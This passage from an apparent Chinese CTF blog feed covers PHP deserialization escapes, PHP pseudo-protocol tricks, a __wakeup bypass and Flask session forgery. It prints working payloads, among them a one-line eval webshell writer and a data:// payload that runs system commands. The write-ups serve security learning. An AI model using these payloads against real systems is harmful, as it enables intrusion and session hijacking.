function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> </span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>关健代码：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$userinfo</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'img'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>我们需要将_SESSION[‘img’]覆盖为flag的文件名，上面虽然有设置img的值但是会对其进行sha1加密，而下面没有相对于的解密函数，所以我们选择对_SESSION进行直接覆盖，把源代码给的img参数放在序列化}的右边丢掉。</p><h3 id="方法一：键值逃逸"><a href="#方法一：键值逃逸" class="headerlink" title="方法一：键值逃逸"></a>方法一：键值逃逸</h3><hr><p>先写出img想要的序列化：<code>s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code> (ZDBnM19mMWFnLnBocA&#x3D;&#x3D;为d0g3_f1ag.php的base64加密值) 然后在这串字符串前后开始构造payload,再让function等于构造好的序列化<code>&#39;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&#39;</code>最后用会被过滤的字符串设计长度<code>_SESSION[user]=flagflagflagflagflagflag&amp;_SESSION[function]=a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&amp;function=show_image </code>序列化结果为：<code>a:3:&#123;s:4:&quot;user&quot;;s:24:&quot;&quot;;s:8:&quot;function&quot;;s:59:&quot;a&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;s:2:&quot;dd&quot;;s:1:&quot;a&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;</code><br>flagflagflagflagflagflag长度24，被过滤后向后取24长度<code>&quot;;s:8:&quot;function&quot;;s:59:&quot;a</code>作为user的内容(<strong>注意这里因为长度要为24且向后取到的内容要以”结尾，但不包括”，所以要加个a如果是23个字符就不用加a了</strong>)，然后s:3:”img”就会被当作键名s:20:”ZDBnM19mMWFnLnBocA&#x3D;&#x3D;”就会被当作键值，<strong>加上s:2:”dd”;s:1:”a”是因为_SESSION有三个键对，保持格式用</strong></p><h3 id="方法二：键名逃逸"><a href="#方法二：键名逃逸" class="headerlink" title="方法二：键名逃逸"></a>方法二：键名逃逸</h3><hr><p>原理也是一样的payload&#x3D;<code>_SESSION[flagphp]=;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mMWFnLnBocA==&quot;;&#125;</code>序列化结果为<code>&quot;a:2:&#123;s:7:&quot;&quot;;s:48:&quot;;s:1:&quot;1&quot;;s:3:&quot;img&quot;;s:20:&quot;ZDBnM19mbGxsbGxsYWc=&quot;;&#125;&quot;;s:3:&quot;img&quot;;s:20:&quot;Z3Vlc3RfaW1nLnBuZw==&quot;;&#125;&quot;</code><br><a href="https://blog.csdn.net/a3320315/article/details/104118688/">参考链接1</a><br><a href="https://www.cnblogs.com/h3zh1/p/12732336.html">参考链接2</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用伪协议用法</title>
      <link href="/2023/07/19/%E5%B8%B8%E7%94%A8%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%94%A8%E6%B3%95/"/>
      <url>/2023/07/19/%E5%B8%B8%E7%94%A8%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%94%A8%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="伪协议用法随手记"><a href="#伪协议用法随手记" class="headerlink" title="伪协议用法随手记"></a>伪协议用法随手记</h1><hr><h2 id="包含函数"><a href="#包含函数" class="headerlink" title="包含函数"></a>包含函数</h2><hr><p>PHP里面共有4个与文件包含相关的函数,分别是:</p><pre class="line-numbers language-none"><code class="language-none">include  requireinclude_oncerequire_once<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="支持的协议和封装协议"><a href="#支持的协议和封装协议" class="headerlink" title="支持的协议和封装协议"></a>支持的协议和封装协议</h2><pre class="line-numbers language-none"><code class="language-none">file:&#x2F;&#x2F; — 访问本地文件系统http:&#x2F;&#x2F; — 访问 HTTP(s) 网址ftp:&#x2F;&#x2F; — 访问 FTP(s) URLsphp:&#x2F;&#x2F; — 访问各个输入&#x2F;输出流（I&#x2F;O streams）zlib:&#x2F;&#x2F; — 压缩流data:&#x2F;&#x2F; — 数据（RFC 2397）glob:&#x2F;&#x2F; — 查找匹配的文件路径模式phar:&#x2F;&#x2F; — PHP 归档ssh2:&#x2F;&#x2F; — Secure Shell 2rar:&#x2F;&#x2F; — RARogg:&#x2F;&#x2F; — 音频流expect:&#x2F;&#x2F; — 处理交互式的流<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="CTF中常见的伪协议："><a href="#CTF中常见的伪协议：" class="headerlink" title="CTF中常见的伪协议："></a>CTF中常见的伪协议：</h2><h3 id="1-file-x2F-x2F"><a href="#1-file-x2F-x2F" class="headerlink" title="1.file:&#x2F;&#x2F;"></a>1.file:&#x2F;&#x2F;</h3><p>这个协议可以展现本地文件系统,默认目录是当前的工作目录。<br>file:&#x2F;&#x2F;&#x2F;path&#x2F;to&#x2F;file.ext 在文件包含中其实也就是等价&#x2F;path&#x2F;to&#x2F;file.ext<br>但是如果来个题目给你来个正则匹配..&#x2F; 或&#x2F;开头的时候就可以用这个方法来绕过了。</p><h3 id="2-php-x2F-x2F"><a href="#2-php-x2F-x2F" class="headerlink" title="2.php:&#x2F;&#x2F;"></a>2.php:&#x2F;&#x2F;</h3><h4 id="1-php-x2F-x2F-filter"><a href="#1-php-x2F-x2F-filter" class="headerlink" title="(1)php:&#x2F;&#x2F;filter"></a>(1)php:&#x2F;&#x2F;filter</h4><pre class="line-numbers language-php" data-language="php"><code class="language-php">一种元封装器， 设计用于数据流打开时的筛选过滤应用读取源码：payload<span class="token punctuation">:</span>  php<span class="token punctuation">:</span><span class="token comment">//filter/read=convert.base64-encode/resource=filename</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token function">readfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"http://www.example.com"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>等价于<span class="token function">readfile</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://filter/resource=http://www.example.com"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>读取链<span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://filter/read=convert.base64-encode/resource=test.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>写入链<span class="token function">file_put_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://filter/write=convert.base64-decode/resource=[file]"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"base64"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>这个点在ctf有时候会很有用<span class="token punctuation">,</span>可以绕过一些waf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-php-x2F-x2F-input"><a href="#2-php-x2F-x2F-input" class="headerlink" title="(2)php:&#x2F;&#x2F;input"></a>(2)php:&#x2F;&#x2F;input</h4><pre class="line-numbers language-none"><code class="language-none">可以访问请求的原始数据的只读流, 用于执行php代码,将post请求中的数据作为PHP代码执行(用hackbar或抓包)。   有自身局限性:     allow_url_fopen :off&#x2F;on (默认配置on)            allow_url_include:on (默认配置off)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如：<br><img src="/images/%E5%B8%B8%E7%94%A8%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%94%A8%E6%B3%95/1.png"><br>也可以写入一句话木马：<code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php @eval($_POST[cmd])?&gt;&#39;);?&gt;</code></p><h4 id="3-php-x2F-x2F-data"><a href="#3-php-x2F-x2F-data" class="headerlink" title="(3)php:&#x2F;&#x2F;data"></a>(3)php:&#x2F;&#x2F;data</h4><pre class="line-numbers language-none"><code class="language-none">data:&#x2F;&#x2F;text&#x2F;plain,xxxx(要执行的php代码)data:&#x2F;&#x2F;text&#x2F;plain;base64,xxxx(base64编码后的数据)例：?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,……?page&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJscyIpPz4&#x3D;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/images/%E5%B8%B8%E7%94%A8%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%94%A8%E6%B3%95/1.jpg"></p><p>参考文章：<br><a href="https://xz.aliyun.com/t/5535">https://xz.aliyun.com/t/5535</a><br><a href="https://blog.csdn.net/Mr_helloword/article/details/107929653">https://blog.csdn.net/Mr_helloword/article/details/107929653</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> web原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>序列化与反序列化</title>
      <link href="/2023/07/15/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
      <url>/2023/07/15/%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
      
        <content type="html"><![CDATA[<h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><hr><h2 id="原理："><a href="#原理：" class="headerlink" title="原理："></a>原理：</h2><p><a href="https://blog.csdn.net/m0_55854679/article/details/123463276">参考文章</a></p><ul><li>序列化 (serialize)是将对象的状态信息转换为可以存储或传输的形式的过程。在序列化期间，对象将其当前状态写入到临时或持久性存储区。以后，可以通过从存储区中读取或反序列化对象的状态，重新创建该对象。【将状态信息保存为字符串】<br>序列化: 游戏的存档 —— 把当前的状态保存下来</li><li>序列化就是将对象的状态信息转为字符串储存起来，那么反序列化就是再将这个状态信息拿出来使用，重新再转化为对象或者其他的。【将字符串转化为状态信息】<br>反序列化: 游戏的读档 —— 通过保存下来的信息恢复到当初的状态</li></ul><h2 id="魔法函数："><a href="#魔法函数：" class="headerlink" title="魔法函数："></a>魔法函数：</h2><pre class="line-numbers language-none"><code class="language-none">__construct()  具有构造函数的类会在每次创建新对象时先调用此方法 (构造函数)__destruct() 会在到某个对象的所有引用都被删除或者当对象被显式销毁时执行。(析构函数)__call() 在对象中调用一个不可访问方法时，__call() 会被调用__callStatic() 在静态上下文中调用一个不可访问方法时，__callStatic() 会被调用。__get() 读取不可访问属性的值时，__get() 会被调用。__set() 在给不可访问属性赋值时，__set() 会被调用。__isset() 当对不可访问属性调用 isset() 或 empty() 时，__isset() 会被调用。__unset() 当对不可访问属性调用 unset() 时，__unset() 会被调用。__sleep() 当对象被serialize() 函数处理前，调用__wakeup() 当类被unserialize()时调用 __wakeup 方法，预先准备对象需要的资源。__toString() 该方法用于一个类被当成字符串时应怎样回应__invoke()  当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用__set_state()__clone() 当复制完成时，如果定义了 __clone() 方法，则新创建的对象（复制生成的对象）中的 __clone() 方法会被调用，可用于修改属性的值__debugInfo()  此方法由var_dump（）调用<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="序列化实例："><a href="#序列化实例：" class="headerlink" title="序列化实例："></a>序列化实例：</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">class</span> <span class="token class-name-definition class-name">S</span><span class="token punctuation">&#123;</span>   <span class="token keyword">public</span> <span class="token variable">$test</span><span class="token operator">=</span><span class="token string double-quoted-string">"bihuoedu"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$s</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">S</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//创建一个对象</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//把这个对象进行序列化</span>序列化后得到的结果是这个样子的<span class="token punctuation">:</span><span class="token constant">O</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"S"</span><span class="token punctuation">:</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">&#123;</span>s<span class="token punctuation">:</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"test"</span><span class="token punctuation">;</span>s<span class="token punctuation">:</span><span class="token number">8</span><span class="token punctuation">:</span><span class="token string double-quoted-string">"bihuoedu"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span>    <span class="token constant">O</span><span class="token punctuation">:</span>代表<span class="token keyword type-declaration">object</span>    <span class="token number">1</span><span class="token punctuation">:</span>代表对象名字长度为一个字符    <span class="token constant">S</span><span class="token punctuation">:</span>对象的名称    <span class="token number">1</span><span class="token punctuation">:</span>代表对象里面有一个变量    s<span class="token punctuation">:</span>数据类型    <span class="token number">4</span><span class="token punctuation">:</span>变量名称的长度    test<span class="token punctuation">:</span>变量名称    s<span class="token punctuation">:</span>数据类型    <span class="token number">7</span><span class="token punctuation">:</span>变量值的长度    bihuoedu<span class="token punctuation">:</span>变量值<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="极客大挑战-2019-PHP-1"><a href="#极客大挑战-2019-PHP-1" class="headerlink" title="[极客大挑战 2019]PHP 1"></a>[极客大挑战 2019]PHP 1</h3><hr><p>ps：一题较为简单的入门序列化题目<br>刚开始建议是用dirsearch扫描一下，发现有 <code>www.zip</code> 文件，将它下载下来，flag.php里没有什么有用的信息，我们重点分析class.php文件</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">include</span> <span class="token string single-quoted-string">'flag.php'</span><span class="token punctuation">;</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Name</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'nonono'</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'yesyes'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">=</span> <span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'guest'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span> <span class="token operator">!=</span> <span class="token number">100</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>NO!!!hacker!!!&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You name is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You password is: "</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'admin'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">global</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>            <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/br>hello my friend~~&lt;/br>sorry i can't give you the flag!"</span><span class="token punctuation">;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以看到这里包含了一个flag.php文件在末尾也有echo $flag所以我们重点分析绕过方法，我们的目标是让username&#x3D;admin和password&#x3D;100既可以得到flag<br>在index.php中我们可以看见它以变量select传参，拿到select后会对其进行反序列化，也就是class.php里的内容</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>   <span class="token keyword">include</span> <span class="token string single-quoted-string">'class.php'</span><span class="token punctuation">;</span>   <span class="token variable">$select</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'select'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   <span class="token variable">$res</span><span class="token operator">=</span><span class="token function">unserialize</span><span class="token punctuation">(</span>@<span class="token variable">$select</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>过程：进行序列化时它会对username和password进行赋初值nonono和yesyesyes，在上面的魔法函数中我们看到，如果有unserialize函数那么会先调用__wakeup函数这里username又被赋了guest值然后才去调用__construct函数去正式赋值，当程序要结束时会调用__destruct函数，对username和password进行判断输出。</li></ul><p>序列化脚本其实就是把那些魔法函数去掉，在把unserialize函数改为serialize函数就行了</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">Name</span><span class="token punctuation">&#123;</span>    <span class="token keyword">private</span> <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"yesyesyes"</span><span class="token punctuation">;</span>    <span class="token keyword">private</span> <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"nonono"</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span><span class="token variable">$password</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">username</span><span class="token operator">=</span><span class="token variable">$username</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">password</span><span class="token operator">=</span><span class="token variable">$password</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Name</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'admin'</span><span class="token punctuation">,</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;br>"</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到结果O:4:”Name”:2:{s:14:”Nameusername”;s:5:”admin”;s:14:”Namepassword”;i:100;}<br>我们要避免调用__wakeup函数，它会将我们的输入参数给覆盖掉，在反序列化时，当前属性个数大于实际属性个数时，就会跳过__wakeup()，即把Name后面的数字2该为大于2的数字，于是我们这样构造<code>payload：?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;Nameusername&quot;;s:5:&quot;admin&quot;;s:14:&quot;Namepassword&quot;;i:100;&#125;</code><br><strong>因为username和password是私有变量，变量中的类名前后会有空白符，而复制的时候会丢失，所以要加上%00因此私有字段的字段名在序列化的时候，类名和字段名前面都会加上\0的前缀。字符串长度也包括所加前缀的长度</strong>再次更新payload：<code>?select=O:4:&quot;Name&quot;:3:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125;</code>即可拿到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> web原理讲解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Unicode欺骗和flask结构的session伪造</title>
      <link href="/2023/07/13/Unicode%E6%AC%BA%E9%AA%97%E5%92%8Cflask%E7%BB%93%E6%9E%84%E7%9A%84session%E4%BC%AA%E9%80%A0/"/>
      <url>/2023/07/13/Unicode%E6%AC%BA%E9%AA%97%E5%92%8Cflask%E7%BB%93%E6%9E%84%E7%9A%84session%E4%BC%AA%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="HCTF-2018-admin-1"><a href="#HCTF-2018-admin-1" class="headerlink" title="[HCTF 2018]admin 1"></a>[HCTF 2018]admin 1</h1><hr><ul><li>ps：第一眼看到这题，我的思路是通过二次注入去修改admin的密码从而获取flag的，因为确实和sqli-lab的那题太像了，但是好像做不到，网上也没有这样的做法，但是思路是和要讲的Unicode欺骗是基本一致的……</li></ul><h2 id="方法一：Unicode欺骗"><a href="#方法一：Unicode欺骗" class="headerlink" title="方法一：Unicode欺骗"></a>方法一：Unicode欺骗</h2><hr><p>Unicode 视觉欺骗取决于视觉上可以混淆的字符串：两个 Unicode 字符串外观上非常相似，在通常的屏幕分辨率下，它们以小尺寸的普通字体出现，很容易让人们误认为是另一个，<a href="https://xz.aliyun.com/t/5402">具体文章</a>。</p><p>这里用的是函数上的漏洞，对于ᴬᴰᴹᴵᴺ来说，nodeprep.prepare函数存在漏洞，<strong>它本意是将大写字母转化为小写字母，当出现ᴬᴰᴹᴵᴺ时，就可以把它变成大写的ADMIN</strong>，这个漏洞是思路的核心。</p><p>我们只需注册一个ᴬᴰᴹᴵᴺ这样的账号，在第一次时注册完它会nodeprep.prepare一次，账号就变成了ADMIN，登入完更改密码时会nodeprep.prepare一次，这样我们的修改的密码就变成admin的了，这样我们就成功修改了admin的密码拿到了flag，当然前提是我们拿到了这题的源码有看到这个函数漏洞，网上好像就这个题目可以这么做，记录一下就好了</p><h2 id="方法二：session伪造"><a href="#方法二：session伪造" class="headerlink" title="方法二：session伪造"></a>方法二：session伪造</h2><hr><p>在index.php里可以发现如果session[name]&#x3D;admin就打印flag，flask是轻量级web框架，session存在客户端，我们可以伪造session（cookie）。既然是伪造cookie，那么就要知道它原来的格式是怎么样的，因为原来的session是被加密的所以要对其进行解密，给出解密脚本：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> sys<span class="token keyword">import</span> zlib<span class="token keyword">from</span> base64 <span class="token keyword">import</span> b64decode<span class="token keyword">from</span> flask<span class="token punctuation">.</span>sessions <span class="token keyword">import</span> session_json_serializer<span class="token keyword">from</span> itsdangerous <span class="token keyword">import</span> base64_decode<span class="token keyword">def</span> <span class="token function">decryption</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>    payload<span class="token punctuation">,</span> sig <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    payload<span class="token punctuation">,</span> timestamp <span class="token operator">=</span> payload<span class="token punctuation">.</span>rsplit<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span>    decompress <span class="token operator">=</span> <span class="token boolean">False</span>    <span class="token keyword">if</span> payload<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">b'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> payload<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>        decompress <span class="token operator">=</span> <span class="token boolean">True</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        payload <span class="token operator">=</span> base64_decode<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>    <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>        <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not base64 decode the payload because of '</span>                         <span class="token string">'an exception'</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> decompress<span class="token punctuation">:</span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            payload <span class="token operator">=</span> zlib<span class="token punctuation">.</span>decompress<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">raise</span> Exception<span class="token punctuation">(</span><span class="token string">'Could not zlib decompress the payload before '</span>                             <span class="token string">'decoding the payload'</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> session_json_serializer<span class="token punctuation">.</span>loads<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">print</span><span class="token punctuation">(</span>decryption<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>（虽然看不懂但是大为震撼）<br>解密出来后将name给改成admin的，然后再次用flask-session-cookie-manager（要下）加密，加密要key值，这个key值一般在config.yml文件里，加密完用hackbar输入回去就好了<br><a 